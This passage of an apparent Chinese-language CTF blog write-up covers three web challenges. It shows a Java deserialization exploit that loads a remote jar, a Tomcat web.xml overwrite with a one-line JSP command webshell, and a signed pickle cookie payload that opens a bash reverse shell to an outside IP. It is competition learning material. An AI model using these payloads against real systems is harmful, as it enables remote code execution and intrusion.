alt="image">​</p><p>真是折磨到十一点(早9开始的)</p><p>那此时清楚URLclassloader之后就可以打了，在这里有个反序列化入口，让反序列化去找这个类即可进行类加载从而触发他的静态方法</p><p>打了第一个遍后打第二遍的找类</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/image-20240827231818-ltmwoi3.png" alt="image">​</p><p>‍</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/image-20240827225945-s6s8am5.png" alt="image">​</p><p>‍</p><p>链子是公开的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">https:<span class="hljs-comment">//xz.aliyun.com/t/14732</span><br></code></pre></td></tr></table></figure><p>‍</p><p>Exp</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.example.ycbjava.bean;<br><br><span class="hljs-keyword">import</span> Utils.SerializeTools;<br><span class="hljs-keyword">import</span> com.fasterxml.jackson.databind.node.POJONode;<br><span class="hljs-keyword">import</span> javassist.*;<br><span class="hljs-keyword">import</span> org.springframework.aop.framework.AdvisedSupport;<br><span class="hljs-keyword">import</span> javax.xml.transform.Templates;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.io.Serializable;<br><span class="hljs-keyword">import</span> java.lang.reflect.Constructor;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.lang.reflect.InvocationHandler;<br><span class="hljs-keyword">import</span> java.lang.reflect.Proxy;<br><span class="hljs-keyword">import</span> java.util.Base64;<br><span class="hljs-keyword">import</span> java.util.Hashtable;<br><span class="hljs-keyword">import</span> java.util.Map;<br><span class="hljs-keyword">import</span> <span class="hljs-keyword">static</span> Utils.SerializeTools.CreateWithoutConstructor;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">JacksonnoStable</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">byte</span>[] getPayload(<span class="hljs-type">byte</span>[] clazzBytes) <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">ctClass0</span> <span class="hljs-operator">=</span> pool.get(<span class="hljs-string">&quot;com.fasterxml.jackson.databind.node.BaseJsonNode&quot;</span>);<br>        <span class="hljs-type">CtMethod</span> <span class="hljs-variable">writeReplace</span> <span class="hljs-operator">=</span> ctClass0.getDeclaredMethod(<span class="hljs-string">&quot;writeReplace&quot;</span>);<br>        ctClass0.removeMethod(writeReplace);<br>        ctClass0.toClass();<br>        <span class="hljs-type">User</span> <span class="hljs-variable">user</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>();<br>        user.setUsername(<span class="hljs-string">&quot;jar:http://118.31.166.161:8000/hello.jar!/&quot;</span>);<br>        <span class="hljs-type">POJONode</span> <span class="hljs-variable">jsonNodes</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">POJONode</span>(user);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">Thashmap1</span> <span class="hljs-operator">=</span> (Map) CreateWithoutConstructor(<span class="hljs-string">&quot;javax.swing.UIDefaults$TextAndMnemonicHashMap&quot;</span>);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">Thashmap2</span> <span class="hljs-operator">=</span> (Map) CreateWithoutConstructor(<span class="hljs-string">&quot;javax.swing.UIDefaults$TextAndMnemonicHashMap&quot;</span>);<br>        Thashmap1.put(jsonNodes,<span class="hljs-string">&quot;xx&quot;</span>);<br>        Thashmap2.put(jsonNodes,<span class="hljs-string">&quot;yy&quot;</span>);<br>        SerializeTools.setValue(Thashmap1,<span class="hljs-string">&quot;loadFactor&quot;</span>,<span class="hljs-number">1</span>);<br>        SerializeTools.setValue(Thashmap2,<span class="hljs-string">&quot;loadFactor&quot;</span>,<span class="hljs-number">1</span>);<br>        Hashtable&lt;Object, Object&gt; hashtable = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hashtable</span>&lt;&gt;();<br>        hashtable.put(Thashmap1,<span class="hljs-number">1</span>);<br>        hashtable.put(Thashmap2,<span class="hljs-number">2</span>);<br>        Thashmap1.put(jsonNodes,<span class="hljs-literal">null</span>);<br>        Thashmap2.put(jsonNodes,<span class="hljs-literal">null</span>);<br>        objectOutputStream.writeObject(hashtable);<br>        objectOutputStream.close();<br>        <span class="hljs-type">String</span> <span class="hljs-variable">res</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(barr.toByteArray());<br>        <span class="hljs-keyword">return</span> barr.toByteArray();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>‍</p><h3 id="Tomtom2"><a href="#Tomtom2" class="headerlink" title="Tomtom2"></a>Tomtom2</h3><p>能读xml</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/image-20240828114530-bghtalg.png" alt="image">​</p><p>找到tomcat密码</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">user</span></span><br><span class="hljs-tag">  <span class="hljs-attr">username</span>=<span class="hljs-string">&quot;admin&quot;</span></span><br><span class="hljs-tag">  <span class="hljs-attr">password</span>=<span class="hljs-string">&quot;This_is_my_favorite_passwd&quot;</span></span><br><span class="hljs-tag">  <span class="hljs-attr">roles</span>=<span class="hljs-string">&quot;manager-gui&quot;</span></span><br><span class="hljs-tag">/&gt;</span><br></code></pre></td></tr></table></figure><p>扫到有上传接口 <code>myapp/upload.html</code>​</p><p>上传path可控，测了只能传xml，可以通过覆盖 WEB-INF&#x2F;web.xml 来写个新的servlet，并且指定解析一个xml来作为jsp</p><p>web.xml内容如下</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">web-app</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://xmlns.jcp.org/xml/ns/javaee&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;http://xmlns.jcp.org/xml/ns/javaee http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd&quot;</span></span><br><span class="hljs-tag">         <span class="hljs-attr">version</span>=<span class="hljs-string">&quot;4.0&quot;</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">servlet</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>qwe<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">jsp-file</span>&gt;</span>/WEB-INF/jsp/web.xml<span class="hljs-tag">&lt;/<span class="hljs-name">jsp-file</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">load-on-startup</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">load-on-startup</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">servlet</span>&gt;</span><br>  <span class="hljs-tag">&lt;<span class="hljs-name">servlet-mapping</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">servlet-name</span>&gt;</span>qwe<span class="hljs-tag">&lt;/<span class="hljs-name">servlet-name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">url-pattern</span>&gt;</span>/run<span class="hljs-tag">&lt;/<span class="hljs-name">url-pattern</span>&gt;</span><br>  <span class="hljs-tag">&lt;/<span class="hljs-name">servlet-mapping</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">web-app</span>&gt;</span><br></code></pre></td></tr></table></figure><p>‍</p><p>然后写个JSP即可，也可以写个回显马展示，也可以懒得写直接弹shell随便</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml">&lt;%=Runtime.getRuntime.exec(request.getParameter(&quot;a&quot;))%&gt;<br></code></pre></td></tr></table></figure><h3 id="Lyrics-For-You"><a href="#Lyrics-For-You" class="headerlink" title="Lyrics For You"></a>Lyrics For You</h3><p>有任意文件读，先读 <code>/proc/self/cmdline</code>​</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/image-20240827111219-j5tmiob.png" alt="image">​</p><p>读取源码 <code>/usr/etc/app/app.py</code>​</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">from</span> config.secret_key <span class="hljs-keyword">import</span> secret_code<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> Flask, make_response, request, render_template<br><span class="hljs-keyword">from</span> cookie <span class="hljs-keyword">import</span> set_cookie, cookie_check, get_cookie<br><span class="hljs-keyword">import</span> pickle<br><br>app = Flask(__name__)<br>app.secret_key = random.randbytes(<span class="hljs-number">16</span>)<br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">UserData</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, username</span>):<br>        self.username = username<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">Waf</span>(<span class="hljs-params">data</span>):<br>    blacklist = [<span class="hljs-string">b&#x27;R&#x27;</span>, <span class="hljs-string">b&#x27;secret&#x27;</span>, <span class="hljs-string">b&#x27;eval&#x27;</span>, <span class="hljs-string">b&#x27;file&#x27;</span>, <span class="hljs-string">b&#x27;compile&#x27;</span>, <span class="hljs-string">b&#x27;open&#x27;</span>, <span class="hljs-string">b&#x27;os.popen&#x27;</span>]<br>    valid = <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">for</span> word <span class="hljs-keyword">in</span> blacklist:<br>        <span class="hljs-keyword">if</span> word.lower() <span class="hljs-keyword">in</span> data.lower():<br>            valid = <span class="hljs-literal">True</span><br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">return</span> valid<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/&quot;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;index.html&#x27;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/lyrics&quot;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">lyrics</span>():<br>    resp = make_response()<br>    resp.headers[<span class="hljs-string">&quot;Content-Type&quot;</span>] = <span class="hljs-string">&#x27;text/plain; charset=UTF-8&#x27;</span><br>    query = request.args.get(<span class="hljs-string">&quot;lyrics&quot;</span>)<br>    path = os.path.join(os.getcwd() + <span class="hljs-string">&quot;/lyrics&quot;</span>, query)<br>    <span class="hljs-keyword">try</span>:<br>        <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(path) <span class="hljs-keyword">as</span> f:<br>            res = f.read()<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> e:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;No lyrics found&quot;</span><br>    <span class="hljs-keyword">return</span> res<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/login&quot;</span>, methods=[<span class="hljs-string">&#x27;POST&#x27;</span>, <span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">login</span>():<br>    <span class="hljs-keyword">if</span> request.method == <span class="hljs-string">&#x27;POST&#x27;</span>:<br>        username = request.form[<span class="hljs-string">&quot;username&quot;</span>]<br>        user = UserData(username)<br>        res = &#123;<span class="hljs-string">&quot;username&quot;</span>: user.username&#125;<br>        <span class="hljs-keyword">return</span> set_cookie(<span class="hljs-string">&quot;user&quot;</span>, res, secret=secret_code)<br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;login.html&#x27;</span>)<br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&quot;/board&quot;</span>, methods=[<span class="hljs-string">&#x27;GET&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">board</span>():<br>    invalid = cookie_check(<span class="hljs-string">&quot;user&quot;</span>, secret=secret_code)<br>    <span class="hljs-keyword">if</span> invalid:<br>        <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;Nope, invalid code get out!&quot;</span><br>  <br>    data = get_cookie(<span class="hljs-string">&quot;user&quot;</span>, secret=secret_code)<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(data, <span class="hljs-built_in">bytes</span>):<br>        a = pickle.loads(data)<br>        data = <span class="hljs-built_in">str</span>(data, encoding=<span class="hljs-string">&quot;utf-8&quot;</span>)<br>  <br>    <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;username&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> data:<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;user.html&#x27;</span>, name=<span class="hljs-string">&quot;guest&quot;</span>)<br>  <br>    <span class="hljs-keyword">if</span> data[<span class="hljs-string">&quot;username&quot;</span>] == <span class="hljs-string">&quot;admin&quot;</span>:<br>        <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;admin.html&#x27;</span>, name=data[<span class="hljs-string">&quot;username&quot;</span>])<br>  <br>    <span class="hljs-keyword">return</span> render_template(<span class="hljs-string">&#x27;user.html&#x27;</span>, name=data[<span class="hljs-string">&quot;username&quot;</span>])<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    os.chdir(os.path.dirname(__file__))<br>    app.run(host=<span class="hljs-string">&quot;0.0.0.0&quot;</span>, port=<span class="hljs-number">8080</span>)<br><br></code></pre></td></tr></table></figure><p>读 <code>secret_key.py</code>​</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">secret_code = <span class="hljs-string">&quot;EnjoyThePlayTime123456&quot;</span><br></code></pre></td></tr></table></figure><p>读 <code>cookie.py</code>​</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> base64<br><span class="hljs-keyword">import</span> hashlib<br><span class="hljs-keyword">import</span> hmac<br><span class="hljs-keyword">import</span> pickle<br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> make_response, request<br><br><span class="hljs-comment"># 兼容 Python 2 和 Python 3</span><br>unicode = <span class="hljs-built_in">str</span><br>basestring = <span class="hljs-built_in">str</span><br><br><span class="hljs-comment"># 将数据编码为 cookie 格式</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cookie_encode</span>(<span class="hljs-params">data, key</span>):<br>    <span class="hljs-comment"># 序列化数据并进行 Base64 编码</span><br>    msg = base64.b64encode(pickle.dumps(data, -<span class="hljs-number">1</span>))<br>    <span class="hljs-comment"># 计算 HMAC 签名并进行 Base64 编码</span><br>    sig = base64.b64encode(hmac.new(tob(key), msg, digestmod=hashlib.md5).digest())<br>    <span class="hljs-comment"># 返回编码后的数据</span><br>    <span class="hljs-keyword">return</span> tob(<span class="hljs-string">&#x27;!&#x27;</span>) + sig + tob(<span class="hljs-string">&#x27;?&#x27;</span>) + msg<br><br><span class="hljs-comment"># 将 cookie 数据解码</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cookie_decode</span>(<span class="hljs-params">data, key</span>):<br>    data = tob(data)<br>    <span class="hljs-keyword">if</span> cookie_is_encoded(data):<br>        sig, msg = data.split(tob(<span class="hljs-string">&#x27;?&#x27;</span>), <span class="hljs-number">1</span>)<br>        <span class="hljs-comment"># 验证签名是否匹配</span><br>        <span class="hljs-keyword">if</span> _lscmp(sig[<span class="hljs-number">1</span>:], base64.b64encode(hmac.new(tob(key), msg, digestmod=hashlib.md5).digest())):<br>            <span class="hljs-keyword">return</span> pickle.loads(base64.b64decode(msg))<br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span><br><br><span class="hljs-comment"># 检查数据是否包含黑名单中的关键词</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">waf</span>(<span class="hljs-params">data</span>):<br>    blacklist = [<span class="hljs-string">b&#x27;R&#x27;</span>, <span class="hljs-string">b&#x27;secret&#x27;</span>, <span class="hljs-string">b&#x27;eval&#x27;</span>, <span class="hljs-string">b&#x27;file&#x27;</span>, <span class="hljs-string">b&#x27;compile&#x27;</span>, <span class="hljs-string">b&#x27;open&#x27;</span>, <span class="hljs-string">b&#x27;os.popen&#x27;</span>]<br>    valid = <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">for</span> word <span class="hljs-keyword">in</span> blacklist:<br>        <span class="hljs-keyword">if</span> word <span class="hljs-keyword">in</span> data:<br>            valid = <span class="hljs-literal">True</span><br>            <span class="hljs-keyword">break</span><br>    <span class="hljs-keyword">return</span> valid<br><br><span class="hljs-comment"># 检查 cookie 是否有效</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cookie_check</span>(<span class="hljs-params">key, secret=<span class="hljs-literal">None</span></span>):<br>    a = request.cookies.get(key)<br>    data = tob(request.cookies.get(key))<br>    <span class="hljs-keyword">if</span> data:<br>        <span class="hljs-keyword">if</span> cookie_is_encoded(data):<br>            sig, msg = data.split(tob(<span class="hljs-string">&#x27;?&#x27;</span>), <span class="hljs-number">1</span>)<br>            <span class="hljs-keyword">if</span> _lscmp(sig[<span class="hljs-number">1</span>:], base64.b64encode(hmac.new(tob(secret), msg, digestmod=hashlib.md5).digest())):<br>                res = base64.b64decode(msg)<br>                <span class="hljs-keyword">if</span> waf(res):<br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br>                <span class="hljs-keyword">else</span>:<br>                    <span class="hljs-keyword">return</span> <span class="hljs-literal">False</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">True</span><br><br><span class="hljs-comment"># 将字符串转换为字节</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">tob</span>(<span class="hljs-params">s, enc=<span class="hljs-string">&#x27;utf8&#x27;</span></span>):<br>    <span class="hljs-keyword">return</span> s.encode(enc) <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(s, unicode) <span class="hljs-keyword">else</span> <span class="hljs-built_in">bytes</span>(s)<br><br><span class="hljs-comment"># 从 cookie 中获取数据</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_cookie</span>(<span class="hljs-params">key, default=<span class="hljs-literal">None</span>, secret=<span class="hljs-literal">None</span></span>):<br>    value = request.cookies.get(key)<br>    <span class="hljs-keyword">if</span> secret <span class="hljs-keyword">and</span> value:<br>        dec = cookie_decode(value, secret)<br>        <span class="hljs-keyword">return</span> dec[<span class="hljs-number">1</span>] <span class="hljs-keyword">if</span> dec <span class="hljs-keyword">and</span> dec[<span class="hljs-number">0</span>] == key <span class="hljs-keyword">else</span> default<br>    <span class="hljs-keyword">return</span> value <span class="hljs-keyword">or</span> default<br><br><span class="hljs-comment"># 检查 cookie 是否经过编码</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">cookie_is_encoded</span>(<span class="hljs-params">data</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bool</span>(data.startswith(tob(<span class="hljs-string">&#x27;!&#x27;</span>)) <span class="hljs-keyword">and</span> tob(<span class="hljs-string">&#x27;?&#x27;</span>) <span class="hljs-keyword">in</span> data)<br><br><span class="hljs-comment"># 比较两个字节串是否相等</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">_lscmp</span>(<span class="hljs-params">a, b</span>):<br>    <span class="hljs-keyword">return</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">sum</span>(<span class="hljs-number">0</span> <span class="hljs-keyword">if</span> x == y <span class="hljs-keyword">else</span> <span class="hljs-number">1</span> <span class="hljs-keyword">for</span> x, y <span class="hljs-keyword">in</span> <span class="hljs-built_in">zip</span>(a, b)) <span class="hljs-keyword">and</span> <span class="hljs-built_in">len</span>(a) == <span class="hljs-built_in">len</span>(b)<br><br><span class="hljs-comment"># 设置 cookie</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">set_cookie</span>(<span class="hljs-params">name, value, secret=<span class="hljs-literal">None</span>, **options</span>):<br>    <span class="hljs-keyword">if</span> secret:<br>        value = touni(cookie_encode((name, value), secret))<br>        resp = make_response(<span class="hljs-string">&quot;success&quot;</span>)<br>        resp.set_cookie(name, value, max_age=<span class="hljs-number">3600</span>, **options)<br>        <span class="hljs-keyword">return</span> resp<br>    <span class="hljs-keyword">elif</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">isinstance</span>(value, basestring):<br>        <span class="hljs-keyword">raise</span> TypeError(<span class="hljs-string">&#x27;Secret key missing for non-string Cookie.&#x27;</span>)<br>    <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(value) &gt; <span class="hljs-number">4096</span>:<br>        <span class="hljs-keyword">raise</span> ValueError(<span class="hljs-string">&#x27;Cookie value too long.&#x27;</span>)<br><br><span class="hljs-comment"># 将字节转换为字符串</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">touni</span>(<span class="hljs-params">s, enc=<span class="hljs-string">&#x27;utf8&#x27;</span>, err=<span class="hljs-string">&#x27;strict&#x27;</span></span>):<br>    <span class="hljs-keyword">return</span> s.decode(enc, err) <span class="hljs-keyword">if</span> <span class="hljs-built_in">isinstance</span>(s, <span class="hljs-built_in">bytes</span>) <span class="hljs-keyword">else</span> unicode(s)<br><br></code></pre></td></tr></table></figure><p>找到原题：SekaiCTF 2022 Bottle Poem</p><p>直接使用他们的payload</p><p>发现需要绕过eval</p><p>简单bypass</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> cookie <span class="hljs-keyword">import</span> cookie_encode<br><br>payload =<span class="hljs-string">b&#x27;&#x27;&#x27;(cos</span><br><span class="hljs-string">system</span><br><span class="hljs-string">S&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/47.237.73.23/2333 0&gt;&amp;1&quot;&#x27;</span><br><span class="hljs-string">o.&#x27;&#x27;&#x27;</span><br><br><span class="hljs-built_in">print</span>(a)<br>exp = cookie_encode(<br>    (<span class="hljs-string">&quot;user&quot;</span>, payload),<br>    <span class="hljs-string">&quot;EnjoyThePlayTime123456&quot;</span><br>)<br><span class="hljs-built_in">print</span>(exp)<br></code></pre></td></tr></table></figure><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/image-20240827135618-6r8f6dd.png" alt="image">​</p><p>得到flag</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/image-20240827140116-ky4deme.png" alt="image">​</p><p>‍</p><h2 id="彩蛋"><a href="#彩蛋" class="headerlink" title="彩蛋"></a>彩蛋</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">https:<span class="hljs-comment">//www.zhihu.com/question/665413633  # 如何看待2024羊城杯网络安全大赛</span><br></code></pre></td></tr></table></figure><p>‍</p><p>一群没进决赛的好哥哥全通宵了(真打CTF打的啊？)</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/image-20240828114911-ayslagn.png" alt="image">​</p><p><img src="https://zjacky-blog.oss-cn-beijing.aliyuncs.com/image-20240828115310-1eh9tt8.png" alt="image">​</p><p><img 